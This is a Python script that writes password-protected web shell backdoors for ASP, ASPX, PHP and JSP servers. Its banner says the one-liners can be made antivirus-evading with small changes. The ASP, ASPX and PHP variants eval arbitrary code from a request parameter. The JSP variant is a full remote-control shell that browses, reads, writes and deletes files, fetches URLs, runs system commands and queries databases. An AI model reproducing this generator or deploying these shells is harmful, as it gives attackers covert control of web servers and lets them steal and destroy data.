# !/usr/bin/python
# -*- coding:UTF-8 -*-
# @Author:zhiy0122

import time
import os


message='''\033[1;32m
|---------------------------前言----------------------------------|
本脚本用于生成一句话木马,以后经过很小的改动就可以生成免杀一句话
|----------------------------------------------------------------|
\033[0m'''

print(message)

time.sleep(2)


while True:
    print('1)生成ASP一句话\n2)生成ASPX一句话\n3)生成PHP一句话\n4)生成JSP一句话\n0)退出程序')

    number=input("\033[1;32m请选择>\033[0m")
    if number == '':
        print('\033[1;31m[-]错误！请选择选项\033[0m')
        continue
    else:
        if int(number) == 0:
            break
        else:
            if int(number) == 1:
                passwd = input('木马密码>')
                if passwd == '':
                    print('\033[1;31m[-]错误！密码不能为空\033[0m')
                else:
                    f = open('shell.txt','w')
                    f.write('<%eval request("')
                    f.write(passwd)
                    f.write('")%>')
                    f.close()
                    os.rename('shell.txt','shell.asp')
                    print('\033[1;32m[*]生成完毕\033[0m')
                    continue
            elif int(number) == 2:
                passwd = input('木马密码>')
                if passwd == '':
                    print('\033[1;31m[-]错误！密码不能为空\033[0m')
                else:
                    f = open('shell.txt', 'w')
                    f.write('<%@ Page Language="Jscript"%><%eval(Request.Item["')
                    f.write(passwd)
                    f.write('"],"unsafe");%>')
                    f.close()
                    os.rename('shell.txt', 'shell.aspx')
                    print('\033[1;32m[*]生成完毕\033[0m')
                    continue
            elif int(number) == 3:
                passwd = input('木马密码>')
                if passwd == '':
                    print('\033[1;31m[-]错误！密码不能为空\033[0m')
                else:
                    f = open('shell.txt', 'w')
                    f.write("<?php @eval($_POST['")
                    f.write(passwd)
                    f.write("']); ?>")
                    f.close()
                    os.rename('shell.txt', 'shell.php')
                    print('\033[1;32m[*]生成完毕\033[0m')
                    continue
            elif int(number) == 4:
                # print('待完成')
                passwd = input('木马密码>')
                if passwd == '':
                    print('\033[1;31m[-]错误！密码不能为空\033[0m')
                else:
                    f = open('shell.txt', 'w')
                    ms2='''";
String EC(String s,String c)throws Exception{return s;}//new String(s.getBytes("ISO-8859-1"),c);}
Connection GC(String s)throws Exception{String[] x=s.trim().split("\r\n");Class.forName(x[0].trim()).newInstance();
Connection c=DriverManager.getConnection(x[1].trim());if(x.length>2){c.setCatalog(x[2].trim());}return c;}
void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i<r.length;i++){sb.append(r[i].toString().substring(0,2));}}
void BB(String s,StringBuffer sb)throws Exception{File oF=new File(s),l[]=oF.listFiles();String sT, sQ,sF="";java.util.Date dt;
SimpleDateFormat fm=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");for(int i=0;i<l.length;i++){dt=new java.util.Date(l[i].lastModified());
sT=fm.format(dt);sQ=l[i].canRead()?"R":"";sQ+=l[i].canWrite()?" W":"";if(l[i].isDirectory()){sb.append(l[i].getName()+"/\t"+sT+"\t"+l[i].length()+"\t"+sQ+"\n");}
else{sF+=l[i].getName()+"\t"+sT+"\t"+l[i].length()+"\t"+sQ+"\n";}}sb.append(sF);}
void EE(String s)throws Exception{File f=new File(s);if(f.isDirectory()){File x[]=f.listFiles();
for(int k=0;k<x.length;k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}
void FF(String s,HttpServletResponse r)throws Exception{int n;byte[] b=new byte[512];r.reset();
ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));
os.write(("->"+"|").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write(("|"+"<-").getBytes(),0,3);os.close();is.close();}
void GG(String s, String d)throws Exception{String h="0123456789ABCDEF";int n;File f=new File(s);f.createNewFile();
FileOutputStream os=new FileOutputStream(f);for(int i=0;i<d.length();i+=2)
{os.write((h.indexOf(d.charAt(i))<<4|h.indexOf(d.charAt(i+1))));}os.close();}
void HH(String s,String d)throws Exception{File sf=new File(s),df=new File(d);if(sf.isDirectory()){if(!df.exists()){df.mkdir();}File z[]=sf.listFiles();
for(int j=0;j<z.length;j++){HH(s+"/"+z[j].getName(),d+"/"+z[j].getName());}
}else{FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);
int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}is.close();os.close();}}
void II(String s,String d)throws Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}
void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}
void LL(String s, String d)throws Exception{URL u=new URL(s);int n;FileOutputStream os=new FileOutputStream(d);
HttpURLConnection h=(HttpURLConnection)u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];
while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.close();is.close();h.disconnect();}
void MM(InputStream is, StringBuffer sb)throws Exception{String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));
while((l=br.readLine())!=null){sb.append(l+"\r\n");}}
void NN(String s,StringBuffer sb)throws Exception{Connection c=GC(s);ResultSet r=c.getMetaData().getCatalogs();
while(r.next()){sb.append(r.getString(1)+"\t");}r.close();c.close();}
void OO(String s,StringBuffer sb)throws Exception{Connection c=GC(s);String[] t={"TABLE"};ResultSet r=c.getMetaData().getTables (null,null,"%",t);
while(r.next()){sb.append(r.getString("TABLE_NAME")+"\t");}r.close();c.close();}
void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split("\r\n");Connection c=GC(s);
Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery("select * from "+x[3]);ResultSetMetaData d=r.getMetaData();
for(int i=1;i<=d.getColumnCount();i++){sb.append(d.getColumnName(i)+" ("+d.getColumnTypeName(i)+")\t");}r.close();m.close();c.close();}
void QQ(String cs,String s,String q,StringBuffer sb)throws Exception{int i;Connection c=GC(s);Statement m=c.createStatement(1005,1008);
try{ResultSet r=m.executeQuery(q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(i=1;i<=n;i++){sb.append(d.getColumnName(i)+"\t|\t");
}sb.append("\r\n");while(r.next()){for(i=1;i<=n;i++){sb.append(EC(r.getString(i),cs)+"\t|\t");}sb.append("\r\n");}r.close();}
catch(Exception e){sb.append("Result\t|\t\r\n");try{m.executeUpdate(q);sb.append("Execute Successfully!\t|\t\r\n");
}catch(Exception ee){sb.append(ee.toString()+"\t|\t\r\n");}}m.close();c.close();}
%><%
String cs=request.getParameter("z0")+"";request.setCharacterEncoding(cs);response.setContentType("text/html;charset="+cs);
String Z=EC(request.getParameter(Pwd)+"",cs);String z1=EC(request.getParameter("z1")+"",cs);String z2=EC(request.getParameter("z2")+"",cs);
StringBuffer sb=new StringBuffer("");try{sb.append("->"+"|");
if(Z.equals("A")){String s=new File(application.getRealPath(request.getRequestURI())).getParent();sb.append(s+"\t");if(!s.substring(0,1).equals("/")){AA(sb);}}
else if(Z.equals("B")){BB(z1,sb);}else if(Z.equals("C")){String l="";BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));
while((l=br.readLine())!=null){sb.append(l+"\r\n");}br.close();}
else if(Z.equals("D")){BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));
bw.write(z2);bw.close();sb.append("1");}else if(Z.equals("E")){EE(z1);sb.append("1");}else if(Z.equals("F")){FF(z1,response);}
else if(Z.equals("G")){GG(z1,z2);sb.append("1");}else if(Z.equals("H")){HH(z1,z2);sb.append("1");}else if(Z.equals("I")){II(z1,z2);sb.append("1");}
else if(Z.equals("J")){JJ(z1);sb.append("1");}else if(Z.equals("K")){KK(z1,z2);sb.append("1");}else if(Z.equals("L")){LL(z1,z2);sb.append("1");}
else if(Z.equals("M")){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);
MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals("N")){NN(z1,sb);}else if(Z.equals("O")){OO(z1,sb);}
else if(Z.equals("P")){PP(z1,sb);}else if(Z.equals("Q")){QQ(cs,z1,z2,sb);}
}catch(Exception e){sb.append("ERROR"+":// "+e.toString());}sb.append("|"+"<-");out.print(sb.toString());
%>'''
                    f.write('<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%><%!String Pwd="')
                    f.write(passwd)
                    f.write(ms2)
                    f.close()
                    os.rename('shell.txt', 'shell.jsp')
                    print('\033[1;32m[*]生成完毕\033[0m')
                    continue

